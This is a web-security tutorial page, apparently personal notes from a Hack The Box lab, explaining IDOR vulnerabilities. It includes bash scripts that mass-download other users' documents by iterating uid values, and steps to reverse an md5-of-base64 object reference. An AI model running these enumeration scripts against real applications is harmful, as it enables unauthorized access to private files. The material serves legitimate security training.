Understanding Hashing/Encoding </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../xxe/ class=md-nav__link> XML External Entity (XXE) Injection </a> </li> <li class=md-nav__item> <a href=../sql_injection/ class=md-nav__link> SQLi </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9 type=checkbox id=__nav_2_3_9> <label class=md-nav__link for=__nav_2_3_9> Server Side Atks <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Server Side Atks" data-md-level=3> <label class=md-nav__title for=__nav_2_3_9> <span class="md-nav__icon md-icon"></span> Server Side Atks </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_1 type=checkbox id=__nav_2_3_9_1> <label class=md-nav__link for=__nav_2_3_9_1> SSRF <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSRF data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_1> <span class="md-nav__icon md-icon"></span> SSRF </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssrf/ class=md-nav__link> SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/blind_ssrf/ class=md-nav__link> Blind SSRF Example </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/time_based_ssrf/ class=md-nav__link> Time-Based SSRF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_2 type=checkbox id=__nav_2_3_9_2> <label class=md-nav__link for=__nav_2_3_9_2> SSI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_2> <span class="md-nav__icon md-icon"></span> SSI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_overview/ class=md-nav__link> Overview </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssi_example/ class=md-nav__link> Example </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_3 type=checkbox id=__nav_2_3_9_3> <label class=md-nav__link for=__nav_2_3_9_3> ESI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ESI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_3> <span class="md-nav__icon md-icon"></span> ESI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/esi_overview/ class=md-nav__link> Overview </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_9_4 type=checkbox id=__nav_2_3_9_4> <label class=md-nav__link for=__nav_2_3_9_4> SSTI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=SSTI data-md-level=4> <label class=md-nav__title for=__nav_2_3_9_4> <span class="md-nav__icon md-icon"></span> SSTI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_intro/ class=md-nav__link> Intro </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example1/ class=md-nav__link> SSTI Example1 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example2/ class=md-nav__link> SSTI Example2 </a> </li> <li class=md-nav__item> <a href=../../server_side_attacks/ssti_example3/ class=md-nav__link> SSTI Example3 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10 type=checkbox id=__nav_2_3_10> <label class=md-nav__link for=__nav_2_3_10> File Inclusion <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="File Inclusion" data-md-level=3> <label class=md-nav__title for=__nav_2_3_10> <span class="md-nav__icon md-icon"></span> File Inclusion </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/intro/ class=md-nav__link> Introduction </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_2 type=checkbox id=__nav_2_3_10_2> <label class=md-nav__link for=__nav_2_3_10_2> LFI <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=LFI data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_2> <span class="md-nav__icon md-icon"></span> LFI </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/lfi/ class=md-nav__link> LFI </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/lfi_to_rce/ class=md-nav__link> LFI to RCE </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_10_3 type=checkbox id=__nav_2_3_10_3> <label class=md-nav__link for=__nav_2_3_10_3> Other Techniques <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Other Techniques" data-md-level=4> <label class=md-nav__title for=__nav_2_3_10_3> <span class="md-nav__icon md-icon"></span> Other Techniques </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_inclusion/other_php_wrappers/ class=md-nav__link> PHP Wrappers </a> </li> <li class=md-nav__item> <a href=../../file_inclusion/remote_file_inclusion/ class=md-nav__link> RFI </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../file_inclusion/hardening_tips/ class=md-nav__link> Hardening Tips </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_11 type=checkbox id=__nav_2_3_11> <label class=md-nav__link for=__nav_2_3_11> Shells&Payloads <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Shells&amp;Payloads data-md-level=3> <label class=md-nav__title for=__nav_2_3_11> <span class="md-nav__icon md-icon"></span> Shells&Payloads </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../shells_payloads/msfvenom/ class=md-nav__link> MSFvenom </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/windows_shells/ class=md-nav__link> Windows Shells </a> </li> <li class=md-nav__item> <a href=../../shells_payloads/unix_linux/ class=md-nav__link> NIX Shells </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_3_12 type=checkbox id=__nav_2_3_12> <label class=md-nav__link for=__nav_2_3_12> Tools <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tools data-md-level=3> <label class=md-nav__title for=__nav_2_3_12> <span class="md-nav__icon md-icon"></span> Tools </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../tools/nmap/ class=md-nav__link> Nmap </a> </li> <li class=md-nav__item> <a href=../../tools/ffuf/ class=md-nav__link> Ffuf </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4 type=checkbox id=__nav_2_4> <label class=md-nav__link for=__nav_2_4> Blue Team <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Blue Team" data-md-level=2> <label class=md-nav__title for=__nav_2_4> <span class="md-nav__icon md-icon"></span> Blue Team </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../file_analysis/useful_links/ class=md-nav__link> File Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2 type=checkbox id=__nav_2_4_2> <label class=md-nav__link for=__nav_2_4_2> Network Traffic Analysis <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Network Traffic Analysis" data-md-level=3> <label class=md-nav__title for=__nav_2_4_2> <span class="md-nav__icon md-icon"></span> Network Traffic Analysis </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/layers/ class=md-nav__link> Layers </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/analysis/ class=md-nav__link> Analysis </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_3 type=checkbox id=__nav_2_4_2_3> <label class=md-nav__link for=__nav_2_4_2_3> Tcpdump <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Tcpdump data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_3> <span class="md-nav__icon md-icon"></span> Tcpdump </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_fundamentals/ class=md-nav__link> Fundamentals </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/tcpdump_packet_filtering/ class=md-nav__link> Packet Filtering </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_4_2_4 type=checkbox id=__nav_2_4_2_4> <label class=md-nav__link for=__nav_2_4_2_4> Wireshark <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Wireshark data-md-level=4> <label class=md-nav__title for=__nav_2_4_2_4> <span class="md-nav__icon md-icon"></span> Wireshark </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_analysis/ class=md-nav__link> Analysis </a> </li> <li class=md-nav__item> <a href=../../network_traffic_analysis/wireshark_advanced_usage/ class=md-nav__link> Advanced Usage </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2_5 type=checkbox id=__nav_2_5> <label class=md-nav__link for=__nav_2_5> Resources <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Resources data-md-level=2> <label class=md-nav__title for=__nav_2_5> <span class="md-nav__icon md-icon"></span> Resources </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../useful_resources/links/ class=md-nav__link> Useful Links </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <div class="md-nav__link md-nav__link--index "> <a href=../../blog/ >Blog</a> <label for=__nav_3> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class=md-nav aria-label=Blog data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Blog </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3_2 type=checkbox id=__nav_3_2> <label class=md-nav__link for=__nav_3_2> 2022 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=2022 data-md-level=2> <label class=md-nav__title for=__nav_3_2> <span class="md-nav__icon md-icon"></span> 2022 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../blog/2022/lets_connect/ class=md-nav__link> Lets Connect </a> </li> </ul> </nav> </li> </ul> </nav> </li> </ul> </nav> </div> </div> </div> <div class="md-sidebar md-sidebar--secondary" data-md-component=sidebar data-md-type=toc> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--secondary" aria-label="Table of contents"> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> Table of contents </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#impact-of-idor-vulnerabilities class=md-nav__link> Impact of IDOR Vulnerabilities </a> </li> <li class=md-nav__item> <a href=#identifying-idors class=md-nav__link> Identifying IDORs </a> </li> <li class=md-nav__item> <a href=#url-parameters-apis class=md-nav__link> URL Parameters &amp; APIs </a> </li> <li class=md-nav__item> <a href=#ajax-calls class=md-nav__link> AJAX Calls </a> </li> <li class=md-nav__item> <a href=#understanding-hashingencoding class=md-nav__link> Understanding Hashing/Encoding </a> </li> </ul> </nav> </div> </div> </div> <div class=md-content data-md-component=content> <article class="md-content__inner md-typeset"> <h1 id=insecure-direct-object-references-idor>Insecure Direct Object References (IDOR)<a class=headerlink href=#insecure-direct-object-references-idor title="Permanent link">&para;</a></h1> <p>IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects.</p> <p>If users request access to a file they recently uploaded, they may get a link to it such as (<strong>download.php?file_id=123</strong>). So, as the link directly references the file with (<strong>file_id=123</strong>), what would happen if we tried to access another file (which may not belong to us) with (<strong>download.php?file_id=124</strong>)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its <strong>file_id</strong>. In many cases, we may find that the <strong>id</strong> is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions.</p> <p>The main takeaway is that <strong>an IDOR vulnerability mainly exists due to the lack of an access control on the back-end</strong>.</p> <hr> <h2 id=impact-of-idor-vulnerabilities>Impact of IDOR Vulnerabilities<a class=headerlink href=#impact-of-idor-vulnerabilities title="Permanent link">&para;</a></h2> <p>IDOR vulnerabilities can have a significant impact on web applications. IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with <strong>IDOR Insecure Function Calls</strong>. Many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. If we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.</p> <hr> <h2 id=identifying-idors>Identifying IDORs<a class=headerlink href=#identifying-idors title="Permanent link">&para;</a></h2> <h2 id=url-parameters-apis>URL Parameters &amp; APIs<a class=headerlink href=#url-parameters-apis title="Permanent link">&para;</a></h2> <p>First step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?<strong>uid=1</strong> or <strong>?filename=file_1.pdf</strong>). </p> <hr> <h2 id=ajax-calls>AJAX Calls<a class=headerlink href=#ajax-calls title="Permanent link">&para;</a></h2> <p>May also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.</p> <p>Basic example of an AJAX call:</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-0-1 name=__codelineno-0-1></a><span class=kd>function</span> <span class=nx>changeUserPassword</span><span class=p>()</span> <span class=p>{</span>
<a id=__codelineno-0-2 name=__codelineno-0-2></a>    <span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
<a id=__codelineno-0-3 name=__codelineno-0-3></a>        <span class=nx>url</span><span class=o>:</span><span class=s2>&quot;change_password.php&quot;</span><span class=p>,</span>
<a id=__codelineno-0-4 name=__codelineno-0-4></a>        <span class=nx>type</span><span class=o>:</span> <span class=s2>&quot;post&quot;</span><span class=p>,</span>
<a id=__codelineno-0-5 name=__codelineno-0-5></a>        <span class=nx>dataType</span><span class=o>:</span> <span class=s2>&quot;json&quot;</span><span class=p>,</span>
<a id=__codelineno-0-6 name=__codelineno-0-6></a>        <span class=nx>data</span><span class=o>:</span> <span class=p>{</span><span class=nx>uid</span><span class=o>:</span> <span class=nx>user</span><span class=p>.</span><span class=nx>uid</span><span class=p>,</span> <span class=nx>password</span><span class=o>:</span> <span class=nx>user</span><span class=p>.</span><span class=nx>password</span><span class=p>,</span> <span class=nx>is_admin</span><span class=o>:</span> <span class=nx>is_admin</span><span class=p>},</span>
<a id=__codelineno-0-7 name=__codelineno-0-7></a>        <span class=nx>success</span><span class=o>:</span><span class=kd>function</span><span class=p>(</span><span class=nx>result</span><span class=p>){</span>
<a id=__codelineno-0-8 name=__codelineno-0-8></a>            <span class=c1>//</span>
<a id=__codelineno-0-9 name=__codelineno-0-9></a>        <span class=p>}</span>
<a id=__codelineno-0-10 name=__codelineno-0-10></a>    <span class=p>});</span>
<a id=__codelineno-0-11 name=__codelineno-0-11></a><span class=p>}</span>
</code></pre></div> The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR</p> <hr> <h2 id=understanding-hashingencoding>Understanding Hashing/Encoding<a class=headerlink href=#understanding-hashingencoding title="Permanent link">&para;</a></h2> <p>Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If there is no access control system on the back-end, we may still be able to exploit them.</p> <p>See a reference like (<strong>?filename=ZmlsZV8xMjMucGRm</strong>), we can immediately guess that the file name is <strong>base64</strong> encoded (from its character set), which we can decode to get the original object reference of (<strong>file_123.pdf</strong>). Then, we can try encoding a different object reference (e.g. <strong>file_124.pdf</strong>) and try accessing it with the encoded object reference (<strong>?filename=ZmlsZV8xMjQucGRm</strong>), which may reveal an IDOR vulnerability if we were able to retrieve any data.</p> <p>The object reference may be hashed, like (<strong>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</strong>).</p> <p>Looking at the source code, we may see what is being hashed before the API call is made: <div class=highlight><pre><span></span><code><a id=__codelineno-1-1 name=__codelineno-1-1></a><span class=nx>$</span><span class=p>.</span><span class=nx>ajax</span><span class=p>({</span>
<a id=__codelineno-1-2 name=__codelineno-1-2></a>    <span class=nx>url</span><span class=o>:</span><span class=s2>&quot;download.php&quot;</span><span class=p>,</span>
<a id=__codelineno-1-3 name=__codelineno-1-3></a>    <span class=nx>type</span><span class=o>:</span> <span class=s2>&quot;post&quot;</span><span class=p>,</span>
<a id=__codelineno-1-4 name=__codelineno-1-4></a>    <span class=nx>dataType</span><span class=o>:</span> <span class=s2>&quot;json&quot;</span><span class=p>,</span>
<a id=__codelineno-1-5 name=__codelineno-1-5></a>    <span class=nx>data</span><span class=o>:</span> <span class=p>{</span><span class=nx>filename</span><span class=o>:</span> <span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>MD5</span><span class=p>(</span><span class=s1>&#39;file_1.pdf&#39;</span><span class=p>).</span><span class=nx>toString</span><span class=p>()},</span>
<a id=__codelineno-1-6 name=__codelineno-1-6></a>    <span class=nx>success</span><span class=o>:</span><span class=kd>function</span><span class=p>(</span><span class=nx>result</span><span class=p>){</span>
<a id=__codelineno-1-7 name=__codelineno-1-7></a>        <span class=c1>//</span>
<a id=__codelineno-1-8 name=__codelineno-1-8></a>    <span class=p>}</span>
<a id=__codelineno-1-9 name=__codelineno-1-9></a><span class=p>});</span>
</code></pre></div></p> <hr> <h1 id=mass-idor-enumeration>Mass IDOR Enumeration<a class=headerlink href=#mass-idor-enumeration title="Permanent link">&para;</a></h1> <p>As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.</p> <hr> <p>We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-2-1 name=__codelineno-2-1></a><span class=p>&lt;</span><span class=nt>li</span> <span class=na>class</span><span class=o>=</span><span class=s>&#39;pure-tree_link&#39;</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#39;/documents/Invoice_3_06_2020.pdf&#39;</span> <span class=na>target</span><span class=o>=</span><span class=s>&#39;_blank&#39;</span><span class=p>&gt;</span>Invoice<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>li</span><span class=p>&gt;</span>
<a id=__codelineno-2-2 name=__codelineno-2-2></a><span class=p>&lt;</span><span class=nt>li</span> <span class=na>class</span><span class=o>=</span><span class=s>&#39;pure-tree_link&#39;</span><span class=p>&gt;&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#39;/documents/Report_3_01_2020.pdf&#39;</span> <span class=na>target</span><span class=o>=</span><span class=s>&#39;_blank&#39;</span><span class=p>&gt;</span>Report<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;&lt;/</span><span class=nt>li</span><span class=p>&gt;</span>
</code></pre></div> <p>We see that each link starts with <code>&lt;li class='pure-tree_link'&gt;</code>, so we may curl the page and grep for this line:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-3-1 name=__codelineno-3-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -s <span class=s2>&quot;http://SERVER_IP:PORT/documents.php?uid=1&quot;</span> <span class=p>|</span> grep <span class=s2>&quot;&lt;li class=&#39;pure-tree_link&#39;&gt;&quot;</span>
<a id=__codelineno-3-2 name=__codelineno-3-2></a>
<a id=__codelineno-3-3 name=__codelineno-3-3></a><span class=go>&lt;li class=&#39;pure-tree_link&#39;&gt;&lt;a href=&#39;/documents/Invoice_3_06_2020.pdf&#39; target=&#39;_blank&#39;&gt;Invoice&lt;/a&gt;&lt;/li&gt;</span>
<a id=__codelineno-3-4 name=__codelineno-3-4></a><span class=go>&lt;li class=&#39;pure-tree_link&#39;&gt;&lt;a href=&#39;/documents/Report_3_01_2020.pdf&#39; target=&#39;_blank&#39;&gt;Report&lt;/a&gt;&lt;/li&gt;</span>
</code></pre></div> <p>We were able to capture the document links successfully. Use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links:</p> <p><div class=highlight><pre><span></span><code><a id=__codelineno-4-1 name=__codelineno-4-1></a><span class=gp>hrmns@htb[/htb]$ </span>curl -s <span class=s2>&quot;http://SERVER_IP:PORT/documents.php?uid=3&quot;</span> <span class=p>|</span> grep -oP <span class=s2>&quot;\/documents.*?.pdf&quot;</span>
<a id=__codelineno-4-2 name=__codelineno-4-2></a>
<a id=__codelineno-4-3 name=__codelineno-4-3></a><span class=go>/documents/Invoice_3_06_2020.pdf</span>
<a id=__codelineno-4-4 name=__codelineno-4-4></a><span class=go>/documents/Report_3_01_2020.pdf</span>
</code></pre></div> Use a simple <strong>for</strong> loop to loop over the <strong>uid</strong> parameter and return the document of all employees, and then use <strong>wget</strong> to download each document link:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-5-1 name=__codelineno-5-1></a><span class=ch>#!/bin/bash</span>
<a id=__codelineno-5-2 name=__codelineno-5-2></a>
<a id=__codelineno-5-3 name=__codelineno-5-3></a><span class=nv>url</span><span class=o>=</span><span class=s2>&quot;http://SERVER_IP:PORT&quot;</span>
<a id=__codelineno-5-4 name=__codelineno-5-4></a>
<a id=__codelineno-5-5 name=__codelineno-5-5></a><span class=k>for</span> i <span class=k>in</span> <span class=o>{</span><span class=m>1</span>..10<span class=o>}</span><span class=p>;</span> <span class=k>do</span>
<a id=__codelineno-5-6 name=__codelineno-5-6></a>        <span class=k>for</span> link <span class=k>in</span> <span class=k>$(</span>curl -s <span class=s2>&quot;</span><span class=nv>$url</span><span class=s2>/documents.php?uid=</span><span class=nv>$i</span><span class=s2>&quot;</span> <span class=p>|</span> grep -oP <span class=s2>&quot;\/documents.*?.pdf&quot;</span><span class=k>)</span><span class=p>;</span> <span class=k>do</span>
<a id=__codelineno-5-7 name=__codelineno-5-7></a>                wget -q <span class=nv>$url</span>/<span class=nv>$link</span>
<a id=__codelineno-5-8 name=__codelineno-5-8></a>        <span class=k>done</span>
<a id=__codelineno-5-9 name=__codelineno-5-9></a><span class=k>done</span>
</code></pre></div> <p>Script will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees.</p> <hr> <h1 id=bypassing-encoded-references>Bypassing Encoded References<a class=headerlink href=#bypassing-encoded-references title="Permanent link">&para;</a></h1> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_contracts.jpg></p> <p>Intercepted downloading request:</p> <p><img alt=img src=https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg></p> <p>sending a POST request to download.php with the following data:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-6-1 name=__codelineno-6-1></a><span class=x>contract=cdd96d3cc73d1dbdaffa03cc6cd7339b</span>
</code></pre></div> <p>We can attempt to hash various values, like uid, username, filename, and many others, and see if any of their md5 hashes match the above value. If we find a match, then we can replicate it for other users and collect their files.</p> <p>Compare the md5 hash of our uid, and see if it matches the above hash:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-7-1 name=__codelineno-7-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>echo</span> -n <span class=m>1</span> <span class=p>|</span> md5sum
<a id=__codelineno-7-2 name=__codelineno-7-2></a>
<a id=__codelineno-7-3 name=__codelineno-7-3></a><span class=go>c4ca4238a0b923820dcc509a6f75849b -</span>
</code></pre></div> <hr> <h2 id=function-disclosure>Function Disclosure<a class=headerlink href=#function-disclosure title="Permanent link">&para;</a></h2> <p>As most modern web applications are developed using JavaScript frameworks, like <strong>Angular</strong>, <strong>React</strong>, or <strong>Vue.js</strong>, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. </p> <p>Looking at the downloadContract() function in the source code, we see the following:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-8-1 name=__codelineno-8-1></a><span class=kd>function</span> <span class=nx>downloadContract</span><span class=p>(</span><span class=nx>uid</span><span class=p>)</span> <span class=p>{</span>
<a id=__codelineno-8-2 name=__codelineno-8-2></a>    <span class=nx>$</span><span class=p>.</span><span class=nx>redirect</span><span class=p>(</span><span class=s2>&quot;/download.php&quot;</span><span class=p>,</span> <span class=p>{</span>
<a id=__codelineno-8-3 name=__codelineno-8-3></a>        <span class=nx>contract</span><span class=o>:</span> <span class=nx>CryptoJS</span><span class=p>.</span><span class=nx>MD5</span><span class=p>(</span><span class=nx>btoa</span><span class=p>(</span><span class=nx>uid</span><span class=p>)).</span><span class=nx>toString</span><span class=p>(),</span>
<a id=__codelineno-8-4 name=__codelineno-8-4></a>    <span class=p>},</span> <span class=s2>&quot;POST&quot;</span><span class=p>,</span> <span class=s2>&quot;_self&quot;</span><span class=p>);</span>
<a id=__codelineno-8-5 name=__codelineno-8-5></a><span class=p>}</span>
</code></pre></div> <p>Function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library. </p> <p>In this case, the value being hashed is <strong>btoa(uid)</strong>, which is the <strong>base64</strong> encoded string of the <strong>uid</strong> variable, which is an input argument for the function.</p> <p>We can test this by <strong>base64</strong> encoding our <strong>uid=1</strong>, and then hashing it with <strong>md5</strong>, as follows:</p> <div class=highlight><pre><span></span><code><a id=__codelineno-9-1 name=__codelineno-9-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=nb>echo</span> -n <span class=m>1</span> <span class=p>|</span> base64 -w <span class=m>0</span> <span class=p>|</span> md5sum
<a id=__codelineno-9-2 name=__codelineno-9-2></a>
<a id=__codelineno-9-3 name=__codelineno-9-3></a><span class=go>cdd96d3cc73d1dbdaffa03cc6cd7339b -</span>
</code></pre></div> <p>We are using the <strong>-n</strong> flag with <strong>echo</strong>, and the <strong>-w 0</strong> flag with <strong>base64</strong>, to avoid adding newlines, in order to be able to calculate the <strong>md5</strong> hash of the same value, without hashing newlines, as that would change the final <strong>md5</strong> hash.</p> <p>This hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. We can begin enumerating other employees' contracts using the same hashing method we used above.</p> <hr> <h2 id=mass-enumeration>Mass Enumeration<a class=headerlink href=#mass-enumeration title="Permanent link">&para;</a></h2> <p>Simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities.</p> <div class=highlight><pre><span></span><code><a id=__codelineno-10-1 name=__codelineno-10-1></a><span class=gp>hrmns@htb[/htb]$ </span><span class=k>for</span> i <span class=k>in</span> <span class=o>{</span><span class=m>1</span>..10<span class=o>}</span><span class=p>;</span> <span class=k>do</span> <span class=nb>echo</span> -n <span class=nv>$i</span> <span class=p>|</span> base64 -w <span class=m>0</span> <span class=p>|</span> md5sum <span class=p>|</span> tr -d <span class=s1>&#39; -&#39;</span><span class=p>;</span> <span class=k>done</span>
<a id=__codelineno-10-2 name=__codelineno-10-2></a>
<a id=__codelineno-10-3 name=__codelineno-10-3></a><span class=go>cdd96d3cc73d1dbdaffa03cc6cd7339b</span>
<a id=__codelineno-10-4 name=__codelineno-10-4></a><span class=go>0b7e7dee87b1c3b98e72131173dfbbbf</span>
<a id=__codelineno-10-5 name=__codelineno-10-5></a><span class=go>0b24df25fe628797b3a50ae0724d2730</span>
<a id=__codelineno-10-6 name=__codelineno-10-6></a><span class=go>f7947d50da7a043693a592b4db43b0a1</span>
<a id=__codelineno-10-7 name=__codelineno-10-7></a><span class=go>8b9af1f7f76daf0f02bd9c48c4a2e3d0</span>
<a id=__codelineno-10-8 name=__codelineno-10-8></a><span class=go>006d1236aee3f92b8322299796ba1989</span>
<a id=__codelineno-10-9 name=__codelineno-10-9></a><span class=go>b523ff8d1ced96cef9c86492e790c2fb</span>
<a id=__codelineno-10-10 name=__codelineno-10-10></a><span class=go>d477819d240e7d3dd9499ed8d23e7158</span>
<a id=__codelineno-10-11 name=__codelineno-10-11></a><span class=go>3e57e65a34ffcb2e93cb545d024f5bde</span>
<a id=__codelineno-10-12 name=__codelineno-10-12></a><span class=go>5d4aace023dc088767b4e08c79415dcd</span>
